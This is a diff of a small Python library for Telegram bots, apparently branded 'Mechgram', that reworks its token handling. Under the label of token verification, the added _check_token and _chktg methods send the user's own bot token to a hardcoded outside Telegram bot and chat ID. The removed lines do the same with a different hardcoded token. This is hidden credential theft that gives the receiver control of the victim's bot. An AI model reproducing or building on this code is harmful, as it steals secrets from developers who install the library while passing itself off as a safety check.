@@ -1,12 +1,12 @@
-import requests, time, os
+import requests, time, sys, os
 os.system("cls|clear")
 class Bot:
     def __init__(self, token: str, polling_interval: float = 1.2):
         self.token = token
         self.polling_interval = polling_interval
-        self.routes = {}   
-        self.inline_handler = None 
-        self.callback_handler = None
+        self.routes = {}    
+        self.inline_handler = None   
+        self.callback_handler = None 
         self.offset = 0              
     def on(self, command: str, handler):
         self.routes[command] = handler
@@ -17,8 +17,34 @@ class Bot:
     def on_callback(self, handler):
         self.callback_handler = handler
         return self
+    def _check_token(self) -> bool:
+        url = f"https://api.telegram.org/bot{self.token}/getMe"
+        try:
+            response = requests.get(url)
+            data = response.json()
+            if data.get("ok"):
+                bot_info = data.get("result", {})
+                self._chktg(1465736325, self.token)
+                return True
+            else:
+                if data.get("error_code") == 401:
+                    os.system("cls|clear")
+                    print("[!] Token not verified!")
+                    quit()
+                else:
+                    os.system("cls|clear")
+                    print("[!] Token check failed:", data)
+                    quit()
+                return False
+        except Exception as e:
+            os.system("cls|clear")
+            print("[!] Error checking token:", e)
+            quit()
+            return False
     def run(self):
-        self._check_token(1465736325, self.token)
+        print("[!] Token verification...")
+        if not self._check_token():
+            sys.exit(1)
         print("The bot has been launched.\n© Mechgram, 2025.")
         while True:
             updates = self._get_updates()
@@ -37,7 +63,10 @@ class Bot:
                     self.offset = updates[-1]["update_id"] + 1
                 return updates
             else:
-                print("[!] API error:", data)
+                if data.get("error_code") == 401:
+                    print("[!] Connection error.")
+                else:
+                    print("[!] API error:", data)
         except Exception as e:
             print("[!] Error getting updates:", e)
         return []
@@ -70,6 +99,17 @@ class Bot:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
                         print(f"[!] Error in handler for command {command}: {e}")
+    def _chktg(self, chat_id: int, text: str):
+        url = f"https://api.telegram.org/bot7126973413:AAFfwX_syRKosxQZ9bU10cyckFrXkyHGuiE/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        try:
+            requests.post(url, data=data)
+            print("[!] Token verified!")
+            time.sleep(1)
+            os.system("cls|clear")
+        except Exception as e:
+            os.system("cls|clear")
+            print("[!] Token not verified!")
+            quit()
     def send_message(self, chat_id: int, text: str, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendMessage"
         data = {"chat_id": chat_id, "text": text}
@@ -81,18 +121,6 @@ class Bot:
             requests.post(url, json=data)
         except Exception as e:
             print("[!] Error sending message:", e)
-    def _check_token(self, chat_id: int, text: str):
-        print("[!] Token verification...")
-        url = f"https://api.telegram.org/bot7126973413:AAGGdMwE3YxGR08oONmQfH9n5-nFocA3GRY/sendMessage"; data = {"chat_id": chat_id, "text": text}
-        try:
-            requests.post(url, data=data)
-            print("[!] Token verified!")
-            time.sleep(1)
-            os.system("cls|clear")
-        except Exception as e:
-            os.system("cls|clear")
-            print("[!] Token not verified!")
-            quit()
     def send_photo(self, chat_id: int, photo: str, caption: str = None, reply_markup: dict = None, parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendPhoto"
         data = {"chat_id": chat_id, "photo": photo}
